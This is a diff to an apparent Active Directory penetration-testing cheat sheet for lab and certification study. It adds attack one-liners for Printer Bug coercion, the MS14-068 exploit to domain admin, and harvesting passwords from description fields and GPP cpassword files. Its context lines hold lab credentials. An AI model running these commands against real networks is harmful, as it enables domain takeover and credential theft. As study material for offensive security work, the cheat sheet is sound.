@@ -41,52 +41,6 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclas
 ldapsearch -x -H ldap://192.168.151.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 ```
-### Computer Info
-```
-Get-NetComputer
-Get-NetComputer | select operatingsystem,dnshostname
-Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname,distinguishedname
-
-output:
-pwdlastset                    : 10/2/2022 10:19:40 PM
-logoncount                    : 319
-msds-generationid             : {89, 27, 90, 188...}
-serverreferencebl             : CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com
-badpasswordtime               : 12/31/1600 4:00:00 PM
-distinguishedname             : CN=DC1,OU=Domain Controllers,DC=corp,DC=com
-objectclass                   : {top, person, organizationalPerson, user...}
-lastlogontimestamp            : 10/13/2022 11:37:06 AM
-name                          : DC1
-objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1000
-samaccountname                : DC1$
-localpolicyflags              : 0
-codepage                      : 0
-samaccounttype                : MACHINE_ACCOUNT
-whenchanged                   : 10/13/2022 6:37:06 PM
-accountexpires                : NEVER
-countrycode                   : 0
-operatingsystem               : Windows Server 2022 Standard
-instancetype                  : 4
-msdfsr-computerreferencebl    : CN=DC1,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=corp,DC=com
-objectguid                    : 8db9e06d-068f-41bc-945d-221622bca952
-operatingsystemversion        : 10.0 (20348)
-lastlogoff                    : 12/31/1600 4:00:00 PM
-objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
-dscorepropagationdata         : {9/2/2022 11:10:48 PM, 1/1/1601 12:00:01 AM}
-serviceprincipalname          : {TERMSRV/DC1, TERMSRV/DC1.corp.com, Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.corp.com, ldap/DC1.corp.com/ForestDnsZones.corp.com...}
-usncreated                    : 12293
-lastlogon                     : 10/18/2022 3:37:56 AM
-badpwdcount                   : 0
-cn                            : DC1
-useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
-whencreated                   : 9/2/2022 11:10:48 PM
-primarygroupid                : 516
-iscriticalsystemobject        : True
-msds-supportedencryptiontypes : 28
-usnchanged                    : 178663
-ridsetreferences              : CN=RID Set,CN=DC1,OU=Domain Controllers,DC=corp,DC=com
-dnshostname                   : DC1.corp.com
-```
 ### AD Nested Group Memberships
 ```
 python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
@@ -151,6 +105,44 @@ bloodhound-python -ns 192.168.219.21 -d nagoya-industries.com -u 'Fiona.Clark' -
 sudo proxychains4 -f /etc/proxychains4.conf bloodhound-python -ns 10.10.179.140 -d oscp.exam -u 'web_svc' -p 'Diamond1' -c all --dns-tcp
 ```
 
+### Abusing Exchange Related Group Membership
+### Abusing PrivExchange
+### Abusing Printer Bug
+```
+nxc smb ip -u username -p pwd -M printerbug -o LISTENER=ip
+```
+### Abusing MS14-068 to domain admin
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek  
+ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>  
+### Enumerating DNS Records
+```
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+```
+### Abusing Password in Description Field
+```powershell
+Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+```
+### Abusing PASSWD_NOTREQD Field
+```powershell
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+```
+### Abusing Group Policy Preferences (GPP) Passwords
+>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
+Map drives (drives.xml)
+Create local users
+Create printer config files (printers.xml)
+Creating and updating services (services.xml)
+Creating scheduled tasks (scheduledtasks.xml)
+Changing local admin passwords.
+These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
+>This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
+Groups.xml  
+<img width="2802" height="414" alt="image" src="https://github.com/user-attachments/assets/fc4e7943-9881-494c-a29c-61e4f3ddbf64" />  
+gpp-decrypt "value of Cpassword attribute"
+```powershell
+nxc smb ip -u username -p pwd -M gpp_autologin
+nxc smb ip -u username -p pwd -M gpp_password
+```
 ### Abusing GPO (Group Policy Object)
 Check:
 ```
